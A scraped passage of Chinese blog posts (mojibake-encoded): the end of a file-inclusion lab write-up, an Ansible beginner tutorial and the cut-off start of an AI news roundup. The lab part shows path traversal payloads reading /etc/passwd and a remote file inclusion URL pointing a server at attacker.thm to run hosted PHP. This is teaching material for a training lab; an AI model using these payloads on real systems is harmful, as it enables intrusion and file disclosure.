<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da7462b0de3a4e10893da8e38faf3915~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=EdIhOR0Ip1Z6yxUsOpOWlDoo5BE%3D" alt="image.png" loading="lazy"/></p>
<p>ã€å®éªŒ3ã€‘</p>
<p>1ã€è¾“å…¥testï¼Œå‘ç°è°ƒç”¨inclueï¼ˆincluds/test.phpï¼‰
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48468de028d94a83b301d372270032e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=JXjiZ6iEfUhw%2Fz7NAdNJ37BALZ0%3D" alt="image.png" loading="lazy"/></p>
<p>2ã€å¯ä»¥ä½¿ç”¨../../../../etc/passwd%00ï¼Œè¿™æ ·å¯ä»¥å¿½ç•¥ç©ºå­—èŠ‚%00ä»¥åå¾—éƒ¨åˆ†ï¼Œä»è€Œé˜²æ­¢.phpåç¼€çš„æ‹¼æ¥</p>
<p>ã€å®éªŒ4ã€‘</p>
<p>1ã€æˆ‘ä»¬è¾“å…¥etc/passwd,å‘ç°å¼€å‘è€…ä¸å…è®¸è®¿é—®æŒ‡å®šç›®å½•</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d729e3cfd1a43a8b51388fc72284550~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=XYKHsPxCnDsSBusOJmi%2BV5zObNc%3D" alt="image.png" loading="lazy"/></p>
<p>2ã€ä½¿ç”¨etc/passwd/.ï¼ŒåŠ /.æ˜¯ç”¨æ¥è®¿é—®å½“å‰ç›®å½•ï¼Œç”¨æ¥ç»•è¿‡</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71773408e65a4c4183faa9084d311d80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=Ch1LzPbpAsAVb5FYzC1psKTFwjQ%3D" alt="image.png" loading="lazy"/></p>
<p>ã€å®éªŒ6ã€‘</p>
<p>1ã€å‘ç°åªå…è®¸ä»ç‰¹å®šæ–‡ä»¶å¤¹THM-profileæ¥è¿›è¡Œè®¿é—®</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65847c22f6fa49dc83d1ce6f388df73f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=A9im3Xp%2Flx62zseT0eIUAcriK%2BQ%3D" alt="image.png" loading="lazy"/></p>
<p>2ã€ç”¨THM-profileå¼€å¤´ï¼Œé€šè¿‡ç›®å½•ç©¿é€ï¼Œæ¥è·³å‡ºï¼Œè¿›è€Œè®¿é—®/etc/passwd</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d02cf9123ab4611b1f473e2a7090fec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=wUhelQuxYuCk010nKpvKqXIYMV0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">è¿œç¨‹æ–‡ä»¶åŒ…å«</h3>
<p>ã€å®šä¹‰ã€‘</p>
<ul>
<li>ä¸Â LFIÂ ç±»ä¼¼ï¼ŒRFIÂ å‘ç”Ÿåœ¨ç”¨æˆ·è¾“å…¥è¢«ä¸å½“å‡€åŒ–æ—¶ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿå°†å¤–éƒ¨ URL æ³¨å…¥åˆ° includeÂ å‡½æ•°ä¸­ã€‚RFIÂ çš„ä¸€ä¸ªè¦æ±‚æ˜¯Â allow_url_fopenÂ é€‰é¡¹å¿…é¡»å¼€å¯Â ã€‚</li>
<li>RFI çš„é£é™©é«˜äºÂ LFIï¼Œå› ä¸ºÂ RFIÂ æ¼æ´å…è®¸æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šè·å¾—è¿œç¨‹å‘½ä»¤æ‰§è¡Œæƒé™ï¼Œå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œè‡ªå®šä¹‰çš„å‘½ä»¤</li>
</ul>
<p>ã€ä¾‹å­ã€‘</p>
<p>æ”»å‡»è€…åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ‰˜ç®¡ä¸€ä¸ªÂ PHPÂ æ–‡ä»¶Â <code>http://attacker.thm/cmd.txt</code>ï¼Œå…¶ä¸­Â cmd.txtÂ åŒ…å«æ‰“å°æ¶ˆæ¯Â HelloÂ THMã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?</span>PHP <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello THM"</span>; <span class="hljs-meta">?&gt;</span>
</code></pre>
<p>æ”»å‡»è€…æ³¨å…¥æ¶æ„çš„URL <code>http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt</code>è¿™æ ·å°±èƒ½è¯±å¯¼æœåŠ¡å™¨è®¿é—®è‡ªå·±çš„èŠ‚ç‚¹å¹¶æ‰§è¡Œä»£ç </p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2db26b0d4cb2451f8fa45af8acc17109~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MTk2NTMzMDY3MjEx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768467111&amp;x-signature=2HwMUbLraDA2%2FsCI5Eh8L7BLAYU%3D" alt="image.png" loading="lazy"/></p>
<p>âœ… å¯ä»¥ç”¨<code>python -m http.server</code>å°†æœ¬æœºå¯åŠ¨ä¸ºæœåŠ¡å™¨ï¼Œå¹¶æ–°å»ºphpæ–‡ä»¶ï¼Œå¹¶è¿›è¡Œå®éªŒï¼Œè¯±å¯¼ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œæœ¬æœºæ–°å»ºçš„php</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»Šå¤©æµ…æµ…çš„å›é¡¾ä¸€ä¸‹Ansibleå§]]></title>    <link>https://juejin.cn/post/7592803747470966834</link>    <guid>https://juejin.cn/post/7592803747470966834</guid>    <pubDate>2026-01-08T09:14:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592803747470966834" data-draft-id="7592710766010220554" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»Šå¤©æµ…æµ…çš„å›é¡¾ä¸€ä¸‹Ansibleå§"/> <meta itemprop="keywords" content="è¿ç»´"/> <meta itemprop="datePublished" content="2026-01-08T09:14:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Sheffield"/> <meta itemprop="url" content="https://juejin.cn/user/362164852109770"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»Šå¤©æµ…æµ…çš„å›é¡¾ä¸€ä¸‹Ansibleå§
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/362164852109770/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Sheffield
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:14:35.000Z" title="Thu Jan 08 2026 09:14:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä»€ä¹ˆæ˜¯Ansibleï¼Œä»–æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</h2>
<p>Ansibleæ˜¯ä¸€æ¬¾<strong>æ— ä»£ç†è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·</strong>ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯æ‰¹é‡ç®¡ç†æœåŠ¡å™¨ï¼šæ¯”å¦‚æ‰¹é‡æ‰§è¡Œå‘½ä»¤ã€å®‰è£…è½¯ä»¶ã€é…ç½®æœåŠ¡ã€éƒ¨ç½²ä»£ç ç­‰ã€‚</p>
<p>å®ƒçš„ä¼˜åŠ¿å¾ˆæ˜æ˜¾ï¼š</p>
<ul>
<li>æ— ä»£ç†ï¼šè¢«æ§æœåŠ¡å™¨ä¸ç”¨è£…é¢å¤–è½¯ä»¶ï¼Œé SSHå°±èƒ½é€šä¿¡ï¼ˆå¤§å¤šæ•°æœåŠ¡å™¨é»˜è®¤æ”¯æŒï¼‰ã€‚</li>
<li>ç”¨Pythonå†™çš„ï¼Œè·¨å¹³å°ã€å…¼å®¹æ€§å¥½ã€‚</li>
<li>é…ç½®æ–‡ä»¶æ˜¯YAMLæ ¼å¼ï¼Œç®€å•æ˜“æ‡‚ï¼Œä¸ç”¨å†™å¤æ‚ä»£ç ã€‚</li>
<li>è½»é‡ï¼šå®‰è£…ç®€å•ï¼Œå­¦ä¹ æˆæœ¬ä½ã€‚</li>
</ul>
<h2 data-id="heading-1">æ€ä¹ˆå®‰è£…Ansibleï¼Ÿ</h2>
<p>Centos 7 åœ¨æœ‰epelçš„æƒ…å†µä¸‹ï¼š<code>yum install -y ansible</code>å³å¯ã€‚</p>
<h2 data-id="heading-2">Ansibleçš„ç›®å½•ç»“æ„æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>Ansibleé»˜è®¤é…ç½®æ–‡ä»¶å’Œæ ¸å¿ƒç›®å½•éƒ½åœ¨ <code>/etc/ansible/</code> ä¸‹ï¼Œä¸»è¦æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼š</p>
<ul>
<li><strong>ansible.cfgï¼ˆä¸»é…ç½®æ–‡ä»¶ï¼‰</strong> ï¼šæ§åˆ¶Ansibleçš„è¿è¡Œå‚æ•°ï¼Œæ¯”å¦‚é»˜è®¤SSHç«¯å£ã€è¶…æ—¶æ—¶é—´ã€æ¨¡å—è·¯å¾„ç­‰ã€‚æ–°æ‰‹åˆæœŸä¸ç”¨æ”¹ï¼Œç”¨é»˜è®¤é…ç½®å³å¯ï¼Œåç»­ç†Ÿæ‚‰åå†æ ¹æ®éœ€æ±‚è°ƒæ•´ã€‚</li>
<li><strong>hostsï¼ˆä¸»æœºæ¸…å•ï¼‰</strong> ï¼šæœ€æ ¸å¿ƒçš„æ–‡ä»¶ä¹‹ä¸€ï¼ç”¨æ¥è®°å½•æ‰€æœ‰éœ€è¦ç®¡ç†çš„è¢«æ§æœåŠ¡å™¨ä¿¡æ¯ï¼ˆIPã€ç”¨æˆ·åã€ç«¯å£ç­‰ï¼‰ï¼ŒAnsibleæ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå°±æ˜¯é€šè¿‡è¿™ä¸ªæ–‡ä»¶æ‰¾åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚</li>
<li><strong>rolesï¼ˆè§’è‰²ç›®å½•ï¼‰</strong> ï¼šç”¨æ¥å­˜æ”¾Ansibleè§’è‰²ï¼ˆRoleï¼‰ï¼Œæ˜¯è¿›é˜¶åŠŸèƒ½ï¼Œç”¨äºç»„ç»‡å¤æ‚çš„Playbookã€‚</li>
</ul>
<h2 data-id="heading-3">hostçš„ç¼–å†™</h2>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å•å°æœåŠ¡å™¨</span>
lb 192.168.1.100 <span class="hljs-attr">ansible_ssh_user</span>=root ansible_ssh_pass=****

<span class="hljs-comment"># å¤šå°WebæœåŠ¡å™¨åˆ†ç»„</span>
<span class="hljs-section">[web]</span>
web01 192.168.1.100 <span class="hljs-attr">ansible_ssh_user</span>=root ansible_ssh_pass=****
web02 192.168.1.100 <span class="hljs-attr">ansible_ssh_user</span>=root ansible_ssh_pass=****
</code></pre>
<p>ç„¶åä½¿ç”¨<code>ansible lb -m ping</code>/<code>ansible web -m ping</code>æµ‹è¯•ï¼Œå‡ºç° <code>"pong"</code> å°±è¯´æ˜è¿æ¥æˆåŠŸäº†ï¼</p>
<h2 data-id="heading-4">ç¼–å†™è‡ªå·±çš„ç¬¬ä¸€ä¸ªPlaybook</h2>
<p>Ansibleçš„å‰§æœ¬æ˜¯Playbookï¼Œæ ¼å¼æ˜¯ymlï¼Œå¯¹äºç©ºæ ¼æœ‰ä¸¥æ ¼çš„è¦æ±‚ã€‚
ä¸‹é¢æˆ‘å†™ä¸ªå®‰è£…Nginxå’Œå…³é—­SElinuxã€firewalldçš„Playbookï¼Œå¦‚ä¸‹ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Playå—èµ·å§‹ï¼šå®šä¹‰æ•´ä¸ªä»»åŠ¡çš„æ ¸å¿ƒä¿¡æ¯</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">install</span> <span class="hljs-string">Nginx</span>  <span class="hljs-comment"># ä»»åŠ¡åç§°ï¼šæ˜ç¡®è¯¥Playçš„æ ¸å¿ƒä½œç”¨æ˜¯å®‰è£…Nginx</span>
  <span class="hljs-attr">hosts:</span> <span class="hljs-string">lb</span>           <span class="hljs-comment"># ç›®æ ‡ä¸»æœºï¼šæ“ä½œåä¸ºlbçš„æœåŠ¡å™¨</span>
  
  <span class="hljs-attr">tasks:</span>              <span class="hljs-comment"># ä»»åŠ¡åˆ—è¡¨ï¼šåç»­æ‰€æœ‰å…·ä½“æ“ä½œéƒ½æ”¾åœ¨tasksä¸‹</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">install</span> <span class="hljs-string">Nginx</span>  <span class="hljs-comment"># å­ä»»åŠ¡åç§°ï¼šæè¿°å½“å‰æ­¥éª¤ä½œç”¨</span>
      <span class="hljs-attr">yum:</span>                <span class="hljs-comment"># ä½¿ç”¨yumæ¨¡å—</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span>       <span class="hljs-comment"># å®‰è£…çš„è½¯ä»¶åç§°ï¼šnginx</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">present</span>    <span class="hljs-comment"># çŠ¶æ€ï¼špresentè¡¨ç¤ºç¡®ä¿è½¯ä»¶å·²å®‰è£…</span>
    
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">stop</span> <span class="hljs-string">firewalld</span>
      <span class="hljs-attr">service:</span>              <span class="hljs-comment"># ä½¿ç”¨serviceæ¨¡å—ï¼šç®¡ç†ç³»ç»ŸæœåŠ¡</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">firewalld</span>     <span class="hljs-comment"># æ“ä½œçš„æœåŠ¡åç§°ï¼šfirewalld</span>
        <span class="hljs-attr">state:</span> <span class="hljs-string">stopped</span>      <span class="hljs-comment"># æœåŠ¡çŠ¶æ€ï¼šstoppedè¡¨ç¤ºåœæ­¢å½“å‰æœåŠ¡</span>
        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">no</span>         <span class="hljs-comment"># å¼€æœºè‡ªå¯ï¼šnoè¡¨ç¤ºç¦æ­¢æœåŠ¡å¼€æœºè‡ªåŠ¨å¯åŠ¨</span>
    
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">stop</span> <span class="hljs-string">SELinux</span>    <span class="hljs-comment"># å­ä»»åŠ¡åç§°</span>
      <span class="hljs-attr">command:</span> <span class="hljs-string">setenforce</span> <span class="hljs-number">0</span> <span class="hljs-comment"># ä½¿ç”¨commandæ¨¡å—æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span>
</code></pre>
<p>å…ˆå†™è¿™ä¹ˆå¤šï¼Œåé¢æœ‰æ—¶é—´å†å¤šå†™ç‚¹å¹²è´§ğŸ¤­ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 å¹´ AI å¤§äº‹ä»¶çºªè¦]]></title>    <link>https://juejin.cn/post/7592815497847521343</link>    <guid>https://juejin.cn/post/7592815497847521343</guid>    <pubDate>2026-01-08T09:37:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592815497847521343" data-draft-id="7592789801708879913" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 å¹´ AI å¤§äº‹ä»¶çºªè¦"/> <meta itemprop="keywords" content="AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T09:37:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="NanBox"/> <meta itemprop="url" content="https://juejin.cn/user/3175045309414935"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 å¹´ AI å¤§äº‹ä»¶çºªè¦
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3175045309414935/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    NanBox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:37:23.000Z" title="Thu Jan 08 2026 09:37:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 